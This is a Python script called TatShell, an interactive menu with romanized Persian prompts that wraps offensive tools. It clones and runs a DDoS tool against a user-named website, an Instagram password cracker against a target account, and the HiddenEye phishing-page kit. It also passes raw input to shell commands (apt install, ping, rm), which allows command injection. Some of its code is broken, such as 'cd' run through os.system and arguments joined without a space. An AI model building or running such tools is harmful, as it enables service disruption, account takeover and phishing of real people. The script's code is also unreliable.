#tat shell. Tat hack shell for hacking . by ENodder
#CopyRight Tathack. PLEASE DONT COPY
#Tatshell . developed by ENodder. https://t.me/tathack . https://t.me/enodder
#WRITED IN PYTHON
#Shell Bash
#support https://t.me/enodder
#BE HACKER . TATSHELL . ALSO ANOTHER PRODUCT: ShellJ soon...
#ENJOY
#also at github https://github.com/tathack/tatshell.git
#python3 tatshell.py
import os,sys,time
print("\033[1;32mTatShell|Developed by ENodder")
time.sleep(4)
print("""\033[0;35m
ttttttttttttttttt         aaaaaa            tttttttttttttttttt
ttttttttttttttttt     aaaaa     aaaaa       tttttttttttttttttt
     tttttt         aaaaa aaaaaaa aaaaaa            tttttt
     tttttt       aaaaaa            aaaaaaa             tttttt
    ttttt         aaaaa              aaaaa             tttttt
 ttttt            aaaaa              aaaaa          tttttt -tat --hack ---shell. by ENodder
\033[0m""")
time.sleep(1)
def el():
    ask=input("\n\033[1;34m//TSH++++=>\033[0m ")
    if "begoo" in ask:
        print("BIA: "+ask.replace("begoo ", ""))
        el()
    elif "hack" in ask:
        if ask=="hack":
            print("tatshell . hack kon donyaro. benevis:\nhack site\tbaraye hack site\nhack insta\tbaraye crack acc insta ba pass list\nhack -fp\tsakht fake page bara phishing\nENodder/Tatshell/Tathack")
            el()
        elif ask=="hack site":
            print("Tatshell. By ENodder. shoma bayad bezani:\nhack site IP\nbaraye bedast oovoordan ip ya host site benevisi: \nhost www.SITE.COM")
            el()
        elif "hack site " in ask:
            print("TARGET: "+ask.replace("hack site ", ""))
            if os.path.exists("hammer"):
                print("DDoSing")
                os.system("python3 hammer/hammer.py -s "+ask.replace("hack site ", "")+" -p 443")
                el()
            else:
                print("Hammer nasb nashode, dar hal nasb...")
                time.sleep(2)
                os.system("git clone https://github.com/cyweb/hammer")
                el()
        elif ask=="hack insta":
            print("TAT SHELL. Product by ENodder. made in iran. Benevisid:\nhack insta ID_TARGET\nTSH")
            el()
        elif "hack insta " in ask:
            print("Target: ",ask.replace("hack insta ", ""))
            js=input("passwordlist.txt> ")
            print("pass word list: ", js)
            time.sleep(2)
            if os.path.exists(js):
                ju=input("Instagram-cracker nasb konim ya darid(y/n): ")
                if "y" in ju:
                    print("dar hal nasb")
                    time.sleep(2)
                    os.system("git clone https://github.com/Pure-L0G1C/Instagram")
                    os.system("cd Instagram")
                    os.system("pip install -r requirements.txt")
                    print("dobare benevisid hack insta ID_TARGET")
                    el()
                else:
                    print("attacking...")
                    os.system("cd Instagram")
                    os.system("python instagram.py "+ask.replace("hack insta ", "")+js)
                    el()
            else:
                print("VOJOOD NADARE PASSWORD LISTET AZIZ")
                el()
        elif ask=="hack -fp":
            print("Salam dada.")
            if os.path.exists("HiddenEye"):
                print("DAR HAL SAKHT")
                os.system("cd HiddenEye")
                os.system("python HiddenEye.py")
                el()
            else:
                print("H-E ke nasb ni. beza nasbesh konam")
                os.system("git clone https://github.com/DarkSecDevelopers/HiddenEye")
                os.system("cd HiddenEye")
                os.system("pip install -r requirements.txt")
                os.system("python HiddenEye.py")
                el()
    elif "pack " in ask:
        print("dar hal nasb")
        os.system("apt install "+ask.replace("pack ", ""))
        el()
    elif ask=="pack":
        print("benevis:\npack PACKAGENAME\nmasalan:\npack npm")
        el()
    elif ask=="tatshell":
        print("bale?")
        el()
    elif "salam" in ask:
        print("aleik salam")
        el()
    elif ask=="host":
        print("Tatshell ping tool. benevis: \nhost www.TARGET.COM")
        el()
    elif "host " in ask:
        print("tatshell ping tool")
        os.system("ping "+ask.replace("host ",""))
        el()
    elif "telegram" in ask:
        print("https://t.me/tathack ((https://t.me/ENodder")
        el()
    elif "update" in ask:
        print("updating Tatshell")
        time.sleep(3)
        os.system("git clone https://github.com/tathack/tatshell.git")
        print("tatshell update shod. in noskhe ghadimie va beroozesh to /tatshell/Tatshell.git hast")
        exit()
    elif "exit" in ask:
        print("Tatshell/ ENodder: \033[1;31mChose oomadi dada sik kon :|")
        exit()
    elif ask=="download":
        print("Bezoodi Repository misazim va baed package manager ro ok mikonim. Tatshell")
        el()
    elif "download " in ask:
        print("Bezoodi Repository misazim va baed package manager ro ok mikonim. Tatshell")
        el()
    elif ask=="file":
        print("TatShell File manager . bezanid:\nfile --bekhoon\tfiley ke migid ro mikhoone\nfile --besaz\tBaraye sakhtan yek file ke esmesho migid.\nfile --behazf\tFiley ke migid ro delete mikone. Tatshell")
        el()
    elif "file " in ask:
        if "file --besaz" in ask:
            joo=input("Esm file (file .txt mibashad): ")
            cacos=open(joo+".txt", "x")
            cacos.write("THIS FILE WAS BUIL BY TATSHELL/ENodder.")
            cacos.close()
            el()
        elif "file --bekhoon" in ask:
            joos=input("Esm file: ")
            cacoss=open(joos, "r")
            cacoss.close()
            el()
        elif "file --behazf" in ask:
            ss=input("Esm file: ")
            if os.path.exists(ss):
                print(ss+"\nHazf shod")
                os.system("rm "+ss)
                el()
            else:
                print("\nIN FILE VOJOOD NADARE YA INJA NIST YA DOROST NADADI :/")
                el()
        else:
            print("\nDADASH HAMCHIN OPTIONI TO DASTOOR file Vojood nadare. benivis file ")
            el()
    elif ask=="folder":
        print("Bezoodi...")
        el()
    elif "theme" in ask:
        print("\nUpdate Baedi :)")
        el()
    elif "version" in ask:
        print("\nEtteLaat:\nTatshell (TSH) by ENodder\nTatshell 1.2\nTermux-Version: 1.94\nENodder Firmware: 1.1.2 Beta\nCountry: iran\ngithub: https://github.com/tathack/tatshell.git\nLicense: 8uJ1c5Sal9ixSg1\nLicense Key: Next Update\nTSH/Tatshell a product by ENodder . telegram https://t.me/tathack.\nsupport https://t.me/enodder")
        el()
    else:
        print("\nDastoor Namoshakhas")
        el()
try:
    el()
except KeyboardInterrupt:
    try:
        el()
    except KeyboardInterrupt:
        el()
        print("exit for exit")
